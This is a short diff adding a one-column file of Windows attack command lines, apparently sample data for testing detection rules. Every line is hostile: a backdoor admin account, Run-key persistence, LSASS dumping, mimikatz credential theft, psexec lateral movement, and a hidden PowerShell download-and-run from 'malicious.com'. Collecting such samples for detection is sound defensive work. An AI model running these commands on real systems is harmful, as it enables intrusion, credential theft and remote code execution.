@@ -1,0 +1,10 @@
+﻿Commandline
+net user testuser P@ssw0rd! /add
+net localgroup administrators testuser /add
+"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v EvilApp /t REG_SZ /d ""C:\Temp\evil.exe"" /f"
+procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
+taskmgr /dump lsass.exe
+"mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit"
+psexec.py Administrator:Password123@192.168.1.10 cmd.exe
+cmd.exe /Q /C whoami 1> \\127.0.0.1\ADMIN$\__123456789 2>&1
+"powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"""
